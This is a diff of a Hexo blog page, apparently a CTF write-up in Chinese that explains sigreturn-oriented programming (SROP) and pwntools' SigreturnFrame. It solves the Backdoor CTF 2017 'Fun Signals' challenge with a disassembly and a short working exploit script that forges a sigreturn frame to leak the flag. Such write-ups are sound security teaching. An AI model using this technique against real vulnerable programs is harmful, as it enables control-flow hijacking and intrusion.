@@ -13,7 +13,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    About Me |  lzeroyuee&#39;s blog
+    Linux Pwn - 栈溢出与ROP（三） |  lzeroyuee&#39;s blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -48,8 +48,8 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="About-"
-  class="article article-type-About"
+  id="post-Linux-Pwn-栈溢出与ROP（三）"
+  class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
@@ -59,37 +59,87 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  About Me
+  Linux Pwn - 栈溢出与ROP（三）
 </h1>
  
 
     </header>
-       
+     
+    <div class="article-meta">
+      <a href="/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%B8%89%EF%BC%89/" class="article-date">
+  <time datetime="2021-03-06T13:22:36.000Z" itemprop="datePublished">2021-03-06</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">671</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">3 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
     <div class="article-entry" itemprop="articleBody">
        
-  <img src="http://lzeroyuee.cn/images/my.png" style="zoom:50%;border-radius:50%;">
+  <h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP在论文<a target="_blank" rel="noopener" href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf">Framing Signals — A Return to Portable Shellcode</a>中被提出</p>
+<p>与ROP类似，通过一个简单的栈溢出，覆盖返回地址并执行gadgets控制流，不同的是SROP使用<code>sigreturn</code>来覆盖返回地址，并伪造sigcontext结构存放于栈上</p>
+<a id="more"></a>
 
-<ul>
-<li><p><strong>Name</strong>: lzeroyuee</p>
+
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SROP利用了<strong>Signal</strong>机制：当中断或异常产生时，内核会向进程发送一个signal，该进程被挂起，内核为其保存context，之后跳转到先前注册的<strong>signal handler</strong>中进行处理，返回后内核恢复进程context，具体流程如下：</p>
+<ol>
+<li>sigreturn frame被添加到栈中，这个frame保存了context</li>
+<li>一个新的返回地址被添加到栈顶，这个返回地址指向<code>sigreturn</code>系统调用</li>
+<li>signal handler被调用，执行完后若程序为终止则返回地址用于执行<code>signreturn</code>系统调用</li>
+<li><code>sigreturn</code>利用sigreturn frame恢复context</li>
+</ol>
+<p><img src="/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%B8%89%EF%BC%89/1.png"></p>
+<p>不同的架构有不同的sigreturn frame，x86下是<code>sigcontext</code>，x64下是<code>ucontext_t</code></p>
+<p>这里的重点是内核会恢复在栈上保存的signal frame，对于存在栈溢出的程序，可以伪造一个假的sigreturn frame从而利用这种机制控制所有context达到控制流程的效果</p>
+<h3 id="pwntools-srop模块"><a href="#pwntools-srop模块" class="headerlink" title="pwntools srop模块"></a>pwntools srop模块</h3><p>在pwntools库中已经有现成的模块<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/rop/srop.html">pwnlib.rop.srop</a></p>
+<p><code>SigreturnFrame</code>的构造有三种情况：</p>
+<ol>
+<li><p>32位系统上运行32位程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&quot;i386&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>64位系统上运行32位程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>64位系统上运行64位程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
 </li>
-<li><p><strong>Github</strong>: <a target="_blank" rel="noopener" href="https://github.com/l0yuee">l0yuee</a></p>
-</li>
-<li><p><strong>E-Mail</strong>: <a href="mailto:&#x6c;&#48;&#x79;&#117;&#x65;&#x65;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;">&#x6c;&#48;&#x79;&#117;&#x65;&#x65;&#64;&#x31;&#54;&#x33;&#x2e;&#99;&#111;&#109;</a></p>
-</li>
-<li><p><strong>Tags</strong>: </p>
-<ul>
-<li>二进制菜鸡</li>
-<li>网络安全从业者</li>
-<li>病毒分析师（APT方向）</li>
-<li>啥都想学，啥都学不会</li>
-</ul>
-</li>
-<li><p><strong>Company</strong>：</p>
-<ul>
-<li>2020.6 ~ 至今 – <em>Qihoo 360</em></li>
-</ul>
-</li>
-</ul>
+</ol>
+<h3 id="Backdoor-CTF-2017-Fun-Signals"><a href="#Backdoor-CTF-2017-Fun-Signals" class="headerlink" title="Backdoor CTF 2017: Fun Signals"></a>Backdoor CTF 2017: Fun Signals</h3><p>该题关闭了所有保护，为x64程序，反汇编体量也非常小，如下可知该程序就干了两件事情：</p>
+<ol>
+<li><code>read(0, rsp, 0x400)</code></li>
+<li><code>rt_sigreturn</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.shellcode:0000000010000000 ; Segment type: Pure code</span><br><span class="line">.shellcode:0000000010000000 ; Segment permissions: Read&#x2F;Write&#x2F;Execute</span><br><span class="line">.shellcode:0000000010000000 _shellcode      segment byte public &#39;CODE&#39; use64</span><br><span class="line">.shellcode:0000000010000000                 assume cs:_shellcode</span><br><span class="line">.shellcode:0000000010000000                 ;org 10000000h</span><br><span class="line">.shellcode:0000000010000000                 assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.shellcode:0000000010000000</span><br><span class="line">.shellcode:0000000010000000                 public _start</span><br><span class="line">.shellcode:0000000010000000 _start:                                 ; Alternative name is &#39;_start&#39;</span><br><span class="line">.shellcode:0000000010000000                 xor     eax, eax        ; __start</span><br><span class="line">.shellcode:0000000010000002                 xor     edi, edi</span><br><span class="line">.shellcode:0000000010000004                 xor     edx, edx</span><br><span class="line">.shellcode:0000000010000006                 mov     dh, 4</span><br><span class="line">.shellcode:0000000010000008                 mov     rsi, rsp</span><br><span class="line">.shellcode:000000001000000B                 syscall                 ; LINUX - sys_read</span><br><span class="line">.shellcode:000000001000000D                 xor     edi, edi</span><br><span class="line">.shellcode:000000001000000F                 push    0Fh</span><br><span class="line">.shellcode:0000000010000011                 pop     rax</span><br><span class="line">.shellcode:0000000010000012                 syscall                 ; LINUX - sys_rt_sigreturn</span><br><span class="line">.shellcode:0000000010000014                 int     3               ; Trap to Debugger</span><br><span class="line">.shellcode:0000000010000015</span><br><span class="line">.shellcode:0000000010000015 syscall:                                ; LINUX -</span><br><span class="line">.shellcode:0000000010000015                 syscall</span><br><span class="line">.shellcode:0000000010000017                 xor     rdi, rdi</span><br><span class="line">.shellcode:000000001000001A                 mov     rax, 3Ch ; &#39;&lt;&#39;</span><br><span class="line">.shellcode:0000000010000021                 syscall                 ; LINUX - sys_exit</span><br><span class="line">.shellcode:0000000010000021 ; ---------------------------------------------------------------------------</span><br><span class="line">.shellcode:0000000010000023 flag            db &#39;fake_flag_here_as_original_is_at_server&#39;,0</span><br><span class="line">.shellcode:0000000010000023 _shellcode      ends</span><br></pre></td></tr></table></figure>
+<p>flag刚好也在程序中，可以使用<code>write(1, &amp;flag, 40)</code>读取，利用SROP，伪造一个sigreturn frame来完成调用<code>write</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = e.symbols[<span class="string">&quot;flag&quot;</span>]</span><br><span class="line">frame.rdx = <span class="number">40</span></span><br><span class="line">frame.rip = e.symbols[<span class="string">&quot;syscall&quot;</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(frame))</span><br><span class="line">log.info(p.recv(<span class="number">40</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%B8%89%EF%BC%89/2.png"></p>
  
       <!-- reward -->
       
@@ -160,15 +210,27 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://lzeroyuee.cn/about/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://lzeroyuee.cn/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%B8%89%EF%BC%89/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" rel="tag">二进制安全</a></li></ul>
+
     </footer>
   </div>
 
    
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/03/06/Linux-Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP%EF%BC%88%E4%BA%8C%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Linux Pwn - 栈溢出与ROP（二）</div>
+      </a>
+    
+  </nav>
+
    
 <!-- valine评论 -->
 <div id="vcomments-box">
@@ -218,7 +280,8 @@
 </style>
 
  
-    
+   
+     
 </article>
 
 </section>
@@ -368,6 +431,23 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
